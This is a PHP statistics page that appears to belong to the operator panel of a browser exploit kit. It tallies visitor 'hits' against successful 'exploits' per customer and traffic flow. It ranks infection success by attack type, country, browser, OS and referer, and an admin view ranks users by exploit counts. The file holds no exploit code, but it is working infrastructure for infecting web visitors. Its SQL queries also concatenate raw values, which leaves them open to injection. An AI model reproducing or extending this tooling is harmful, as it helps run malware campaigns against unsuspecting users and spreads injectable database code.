<?php

include_once('./gears/page_php_header.php');

// авторизация
include_once('./auth/auth.php');

// ================================== GENERATE STATS ================================== //
?>


<h1>Statistics</h1>

<script>
	$(document).ready(function(){ $('#waitPageModal').modal('hide'); });
</script>

<?php

function cc2exp($cc, $flow_id) {
	global $config;
	$resultCC = cdim('db','query',"SELECT COUNT(*) as cnt, cc FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$flow_id." AND cc = '".$cc."' AND `exp` != '' GROUP BY cc ORDER BY cnt DESC LIMIT 10");
	if (!isset($resultCC[0])) return 0;
	return $resultCC[0]->cnt;
}

function refs2exp($ref, $flow_id) {
	global $config;
	$resultRef = cdim('db','query',"SELECT COUNT(*) as cnt, referer FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$flow_id." AND referer = '".$ref."' AND `exp` != '' GROUP BY referer ORDER BY cnt DESC LIMIT 10");
	if (!isset($resultRef[0])) return 0;
	return $resultRef[0]->cnt;
}

function br2exp($br, $flow_id) {
	global $config;
	$resultBR = cdim('db','query',"SELECT COUNT(*) as cnt, br FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$flow_id." AND br = '".$br."' AND `exp` != '' GROUP BY br ORDER BY cnt DESC LIMIT 10");
	if (!isset($resultBR[0])) return 0;
	return $resultBR[0]->cnt;
}

function os2exp($os, $flow_id) {
	global $config;
	$resultOS = cdim('db','query',"SELECT COUNT(*) as cnt, os FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$flow_id." AND os = '".$os."' AND `exp` != '' GROUP BY os ORDER BY cnt DESC LIMIT 10");
	if (!isset($resultOS[0])) return 0;
	return $resultOS[0]->cnt;
}

// =========  Bots online offline ========= 

if ($config['user']['rights']['rolename'] == 'user') {

	$total = cdim('db','query',"SELECT COUNT(*) as cnt FROM `traff` WHERE user_id = ".$config['user']['id']);


	echo 'Total hits '.$total[0]->cnt."<br>";
	

	$flow = cdim('db','query',"SELECT COUNT(*) as cnt, flow_id FROM `traff` WHERE user_id = ".$config['user']['id']." GROUP BY flow_id ");
	
	if (isset($flow[0])) {
		foreach($flow as $fk => $fv) {
			$flowNum = $fv->flow_id;
			
			echo '<h3>Flow '.$flowNum.': '.$fv->cnt."</h3>";


			$resultEXP = cdim('db','query',"SELECT COUNT(*) as cnt, exp FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." AND exp != '' GROUP BY exp ORDER BY cnt DESC");
			if (!isset($resultEXP[0])) $resultEXP = array();
			
			$resultBR = cdim('db','query',"SELECT COUNT(*) as cnt, br FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." GROUP BY br ORDER BY cnt DESC LIMIT 7");
			if (!isset($resultBR[0])) $resultBR = array();
			
			$resultOS = cdim('db','query',"SELECT COUNT(*) as cnt, os FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." GROUP BY os ORDER BY cnt DESC");
			if (!isset($resultOS[0])) $$resultOS = array();
			
			$resultTOTALExp = cdim('db','query',"SELECT COUNT(*) as cnt FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." AND `exp` != ''");
			if (!isset($resultTOTALExp[0])) $resultTOTALExp = array();
			
			$resultTOTALDld = cdim('db','query',"SELECT COUNT(*) as cnt FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id."");
			if (!isset($resultTOTALDld[0])) $resultTOTALDld = array();

			$resultCC = cdim('db','query',"SELECT COUNT(*) as cnt, cc FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." GROUP BY cc ORDER BY cnt DESC LIMIT 10");
			if (!isset($resultCC[0])) $resultCC = array();


		/****** FOR REFERERS STATS *****/
			$resultRefs = cdim('db','query',"SELECT COUNT(*) as cnt, referer FROM `traff` WHERE user_id = ".$config['user']['id']." AND flow_id = ".$fv->flow_id." GROUP BY referer ORDER BY cnt DESC LIMIT 10");
			if (!isset($resultRefs[0])) $resultRefs = array();
		/***** FOR REFERERS STATS *****/
			
			// рассчитываем параметр other для статы по странам
			$resultCCOther = $resultTOTALDld[0]->cnt;
			foreach ($resultCC as $cctk=>$cctv) { 
				$resultCCOther = $resultCCOther - $cctv->cnt; 
			}
?>

			<script type="text/javascript">
				$(document).ready(function(){

					$("#statGraph<?php echo $flowNum; ?>_4").dxChart({
						//animation: { enabled: false }, render: { force: true },
						rotated: true,
						dataSource: [{ valueType: "Hits/Exploited", hits: <?php echo $resultTOTALDld[0]->cnt; ?>, exploits: <?php echo $resultTOTALExp[0]->cnt; ?> }],
						commonSeriesSettings: {
							argumentField: "valueType",
							type: "bar",
							label: {
								visible: true,
								precision: 1
							}
						},
						argumentAxis: { label: { visible: false} },
						valueAxis: {
							label: {
								visible: true,
								precision: 1
							}
						},
						series: [
							{ valueField: "hits", name: "Hits" },
							{ valueField: "exploits", name: "Exploits" }
						],
						legend: {
							verticalAlignment: "bottom",
							horizontalAlignment: "center"
						}
					});
<?php
/*
					$("#statGraph<?php echo $flowNum; ?>_0").dxChart({
						//animation: { enabled: false }, render: { force: true },
						dataSource: [ { exploit: "exploits", <?php foreach($resultEXP as $k=>$v) { echo $v->exp.': '.$v->cnt.', '; } ?> } ],
						series: [ <?php foreach($resultEXP as $k=>$v) { echo '{valueField: "'.$v->exp.'", name: "'.$v->exp.'"},';	} ?> ],
						equalBarWidth: { width: 30 },
						argumentAxis: { label: {visible: false} },
						commonSeriesSettings: {
							argumentField: "exploit",
							name: "Attack type",
							type: "bar",
							label: {
								visible: true,
								format: "fixedPoint",
								precision: 0
							},
						}, 
						legend: {
							verticalAlignment: "bottom",
							horizontalAlignment: "center"
						},
					});
					
	
					$("#statGraph<?php echo $flowNum; ?>_1").dxPieChart({
						//animation: { enabled: false }, render: { force: true },
						dataSource: [ <?php foreach($resultCC as $k=>$v) { echo '{country: "'.getCNameByCCode($v->cc).'", cnt: '. $v->cnt .'}, '; } echo '{country: "Other", cnt: '.$resultCCOther.'},'?> ],
						legend: {
							orientation: "horizontal",
							itemTextPosition: "right",
							horizontalAlignment: "center",
							verticalAlignment: "bottom",
							rowCount: 1
						},
						series: [{
								argumentField: "country",
								valueField: "cnt",
								label: {
									visible: true,
									font: { size: 10 },
									connector: {
										visible: true,
										width: 0.5
									},
									position: "columns",
									customizeText: function(arg) {
										return arg.valueText + " ( " + arg.percentText + ")";
									}
								}
	
						}],
					});
*/
?>
<?
	/*

					$("#statGraph<?php echo $flowNum; ?>_2").dxChart({
						//animation: { enabled: false }, render: { force: true },
						dataSource: [ 
							{ type: "browsers", <?php foreach($resultBR as $k=>$v) { echo 'br'.md5($v->br).': '.$v->cnt.', '; } ?> }
						],
						series: [ 
							<?php foreach($resultBR as $k=>$v) { echo '{valueField: "br'.md5($v->br).'", name: "'.$v->br.'"},';	} ?> 
						],

						argumentAxis: { label: {visible: false} },
						commonSeriesSettings: {
							argumentField: "type",
							name: "Browsers",
							type: "bar",
							label: {
								visible: true,
								format: "fixedPoint",
								precision: 0
							},
						}, 
						legend: {
							verticalAlignment: "bottom",
							horizontalAlignment: "center"
						},
					});
*/
?>

					$("#statGraph<?php echo $flowNum; ?>_3").dxChart({
						//animation: { enabled: false }, render: { force: true },
						dataSource: [ 
							{ type: "OS", <?php foreach($resultOS as $k=>$v) { echo 'br'.md5($v->os).': '.$v->cnt.', '; } ?> }
						],
						series: [ 
							<?php foreach($resultOS as $k=>$v) { echo '{valueField: "br'.md5($v->os).'", name: "'.$v->os.'"},';	} ?> 
						],
/* 						equalBarWidth: { width: 30 }, */
						argumentAxis: { label: {visible: false} },
						commonSeriesSettings: {
							argumentField: "type",
							name: "OS",
							type: "bar",
							label: {
								visible: true,
								format: "fixedPoint",
								precision: 0
							},
						}, 
						legend: {
							verticalAlignment: "bottom",
							horizontalAlignment: "center"
						},
					});



					
				});
			</script>

			<div class="row-fluid">
				<div class="span9">
					<div id="statGraph<?php echo $flowNum; ?>_4" style="height:180px;"></div>
				</div>
				
				<div class="span3">
					<div>
<?php
					if (isset($resultTOTALDld[0]) && isset($resultTOTALExp[0]) && $resultTOTALDld[0]->cnt!=0 && $resultTOTALExp[0]->cnt!=0) { $onePrc = $resultTOTALDld[0]->cnt/100; $proc = round($resultTOTALExp[0]->cnt/$onePrc, 1); } else { $proc = '0'; }
					echo '<h2 style="padding-top:30px;text-align:center;">'.$proc." %</h2>";
?>
					</div>
				</div>
			</div>

			<hr>

			<div class="row-fluid">
<?php /*
				<div class="span6">
					<h4>Attack type</h4>
					<div id="statGraph<?php echo $flowNum; ?>_0"></div>
				</div>
*/ ?>

				<div class="span6">
					<h4>Attack type<small>(top 10)</small></h4>
					<table class='listing'><thead><tr><th>Name</th><th>Exploits</th><th>Percent</th></tr></thead><tbody>
					<?php
						if (isset($resultEXP[0])) foreach($resultEXP as $k=>$v) {
							echo "<tr><td>";
							echo $v->exp;
							echo "</td><td>";
							echo $v->cnt;
							echo "</td><td>";
							//$exp2exp = exp2exp($v->exp, $fv->flow_id);

							if ($v->cnt!=0 && $resultTOTALExp[0]->cnt) { 
								//$exp2expprc = $v->cnt/100;
								$exp2expprc = round(($v->cnt / $resultTOTALExp[0]->cnt * 100), 1); //$exp2expprc
							} else { $exp2expprc = ''; }
							echo ' &nbsp;&nbsp;('.$exp2expprc.' %)';
							echo "</td></tr>";
						} else {
							echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
						}
					?>
					</tbody></table>
					
				</div>
			
	
				<div class="span6">
					<h4>Countres<small>(top 10)</small></h4>
					<?php /* <div id="statGraph<?php echo $flowNum; ?>_1"></div> */ ?>
					<table class='listing'><thead><tr><th>Name</th><th>Hits</th><th>Exploits</th></tr></thead><tbody>
					<?php
						if (isset($resultCC[0])) foreach($resultCC as $k=>$v) {
							echo "<tr><td>";
							echo '<img src="./images/country/'.strtolower($v->cc).'.gif"> '.$v->cc;
							echo "</td><td>";
							echo $v->cnt;
							echo "</td><td>";
							$cc2exp = cc2exp($v->cc, $fv->flow_id);

							if ($v->cnt!=0 && $cc2exp!=0) { 
								$cc2expprc = $v->cnt/100; $cc2expprc = round($cc2exp/$cc2expprc, 1); 
							} else { $cc2expprc = ''; }
							echo $cc2exp.' &nbsp;&nbsp;('.$cc2expprc.' %)';
							echo "</td></tr>";
						} else {
							echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
						}
					?>
					</tbody></table>
					
				</div>
			</div>
			<hr>
<?php /************** STATISTICS ON REFERERS *******************/ ?>

			<div class="row-fluid">
				<div class="span6">
					<h4>Referers<small>(top 10)</small></h4>
					<table class='listing'><thead><tr><th>Name</th><th>Hits</th><th>Exploits</th></tr></thead><tbody>
					<?php
						if (isset($resultRefs[0])) foreach($resultRefs as $k=>$v) {
							echo "<tr><td>";
							echo ((strlen($v->referer) > 0) ? $v->referer : 'None');
							echo "</td><td>";
							echo $v->cnt;
							echo "</td><td>";
							$refs2exp = refs2exp($v->referer, $fv->flow_id);

							if ($v->cnt!=0 && $refs2exp!=0) { 
								$refs2expprc = $v->cnt/100; $refs2expprc = round($refs2exp/$refs2expprc, 1); 
							} else { $refs2expprc = ''; }
							echo $refs2exp.' &nbsp;&nbsp;('.$refs2expprc.' %)';
							echo "</td></tr>";
						} else {
							echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
						}
					?>
					</tbody></table>
					
				</div>

				<div class="span6">
					<h4>Browsers<small>(top 10)</small></h4>
					
					<table class='listing'><thead><tr><th>Name</th><th>Hits</th><th>Exploits</th></tr></thead><tbody>
					<?php
						if (isset($resultBR[0])) foreach($resultBR as $k=>$v) {
							echo "<tr><td>";
							echo $v->br;
							echo "</td><td>";
							echo $v->cnt;
							echo "</td><td>";
							$br2exp = br2exp($v->br, $fv->flow_id);

							if ($v->cnt!=0 && $br2exp!=0) { 
								$br2expprc = $v->cnt/100; $br2expprc = round($br2exp/$br2expprc, 1); 
							} else { $br2expprc = ''; }
							echo $br2exp.' &nbsp;&nbsp;('.$br2expprc.' %)';
							echo "</td></tr>";
						} else {
							echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
						}
					?>
					</tbody></table>
					
				</div>
			</div>

<?php /************** STATISTICS ON REFERERS *******************/ ?>
			<hr>
			<div class="row-fluid">
	<?php /*
				<div class="span6">
					<h4>Browsers</h4>
					<div id="statGraph<?php echo $flowNum; ?>_2"></div>
				</div>
	*/ ?>



				<div class="span6">
					<h4>OS<small>(top 10)</small></h4>
					
					<table class='listing'><thead><tr><th>Name</th><th>Hits</th><th>Exploits</th></tr></thead><tbody>
					<?php
						if (isset($resultOS[0])) foreach($resultOS as $k=>$v) {
							echo "<tr><td>";
							echo $v->os;
							echo "</td><td>";
							echo $v->cnt;
							echo "</td><td>";
							$os2exp = os2exp($v->os, $fv->flow_id);

							if ($v->cnt!=0 && $os2exp!=0) { 
								$os2expprc = $v->cnt/100; $os2expprc = round($os2exp/$os2expprc, 1); 
							} else { $os2expprc = ''; }
							echo $os2exp.' &nbsp;&nbsp;('.$os2expprc.' %)';
							echo "</td></tr>";
						} else {
							echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
						}
					?>
					</tbody></table>
					
				</div>
	<?php /*
				<div class="span6">
					<h4>OS</h4>
					<div id="statGraph<?php echo $flowNum; ?>_3"></div>
				</div>
	*/ ?>

			</div>

<?php

			$flowNum++;
		} 
	}
?>




<?php
} // end user stats




// =========  Users online (in admin panel) ========= 
if ($config['user']['rights']['rolename']=='admin') {

	$resultDLD = cdim('db','query',"SELECT COUNT(*) as cnt FROM `traff`;");
	$resultEXP = cdim('db','query',"SELECT COUNT(*) as cnt FROM `traff` WHERE `exp` != '';");
	$resultEXPLOITSStat = cdim('db','query',"SELECT COUNT(*) as cnt, exp FROM `traff` WHERE `exp` != '' GROUP BY exp ORDER BY cnt DESC");

	echo "<div class='row-fluid'><div class='span6'>";	
	
	echo "<h4>Overview</h4><table class='listing'><thead><tr><th>Downloads</th><th>Exploits</th><th>%</th></tr></thead><tbody>";
	
	if (isset($resultDLD[0])) {
		echo "<tr><td>";
		echo $resultDLD[0]->cnt;
		echo "</td><td>";
		echo $resultEXP[0]->cnt;
		echo "</td><td>";
		if ($resultDLD[0]->cnt!=0 && $resultEXP[0]->cnt!=0) { $onePrc = $resultDLD[0]->cnt/100; $proc = round($resultEXP[0]->cnt/$onePrc, 1); } else { $proc = '0'; }
		echo $proc.' %';
		echo "</td></tr>";		
	} else {
		echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";


	echo '</div><div class="span6">';

	echo "<h4>Exploits</h4><table class='listing'><thead><tr><th>Type</th><th>Count</th></tr></thead><tbody>";
	if (isset($resultEXPLOITSStat[0])) foreach($resultEXPLOITSStat as $k=>$v){
		echo "<tr><td>";
		echo $v->exp;
		echo "</td><td>";
		echo $v->cnt;
		echo "</td></tr>";
	} else {
		echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";

	echo "</div></div>";	

	echo "<div class='row-fluid'><div class='span4'>";
	
	
	$result = cdim('db','query',"SELECT COUNT(*) as cnt, cc FROM `traff` GROUP BY cc ORDER BY cnt DESC LIMIT 10;");
	echo "<h4>Countres</h4><table class='listing'><thead><tr><th>Option</th><th>Value</th></tr></thead><tbody>";
	
	if ($result) foreach($result as $k=>$v) {
		echo "<tr><td>";
		echo '<img src="./images/country/'.strtolower($result[$k]->cc).'.gif"> '.$result[$k]->cc;
		echo "</td><td>";
		echo $result[$k]->cnt;
		echo "</td></tr>";
	} else {
		echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";

	echo '</div><div class="span4">';

	$result = cdim('db','query',"SELECT COUNT(*) as cnt, br FROM `traff` GROUP BY br ORDER BY cnt DESC LIMIT 10;");
	echo "<h4>Browsers</h4><table class='listing'><thead><tr><th>Option</th><th>Value</th></tr></thead><tbody>";
	
	if ($result) foreach($result as $k=>$v) {
		echo "<tr><td>";
		echo $result[$k]->br;
		echo "</td><td>";
		echo $result[$k]->cnt;
		echo "</td></tr>";
	} else {
		echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";

	echo '</div><div class="span4">';


	$result = cdim('db','query',"SELECT COUNT(*) as cnt, os FROM `traff` GROUP BY os ORDER BY cnt DESC LIMIT 10;");
	echo "<h4>OS</h4><table class='listing'><thead><tr><th>Option</th><th>Value</th></tr></thead><tbody>";
	
	if ($result) foreach($result as $k=>$v) {
		echo "<tr><td>";
		echo $result[$k]->os;
		echo "</td><td>";
		echo $result[$k]->cnt;
		echo "</td></tr>";
	} else {
		echo "<tr><td colspan=2 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";

	echo "</div></div>";

	$result = cdim('db','query',"SELECT COUNT(td.id) as dld, u.* FROM `users` as u LEFT JOIN traff as td on td.user_id = u.id WHERE user_login != 'admin' GROUP BY user_login;");
	$resultEXP = cdim('db','query',"SELECT COUNT(t.id) as exp, t.user_id FROM `traff` as t WHERE exp != '' GROUP BY t.user_id;");
	if (isset($resultEXP[0])) {
		$exp = array();
		foreach($resultEXP as $k=>$v) {
			$exp[$v->user_id] = $v->exp;
		}
	}
	
	echo "<h4>Users</h4><table class='listing'><thead><tr><th>User name</th><th>Last activity</th><th>Downloads</th><th>Exploits</th></tr></thead><tbody>";
	
	if ($result) foreach($result as $k=>$v) {
		
		if (!isset($exp[$result[$k]->id])) $exp[$result[$k]->id] = 0;
		
		$color = (!isset($result[$k]->color) || empty($result[$k]->color)) ? $config['user']['rights']['color'] : $result[$k]->color;
		echo "<tr><td style='color:#". $color .";'>";
		echo $result[$k]->user_login;
		echo "</td><td>";
		echo date("Y/m/d H:i.s", $result[$k]->last_time);
		echo "</td><td>";
		echo $v->dld.'</td><td>'.$exp[$result[$k]->id];
		echo "</td></tr>";
	} else {
		echo "<tr><td colspan=4 style='text-align:center;'>no data...</td></tr>";
	}
	echo "</tbody></table>";





}
?>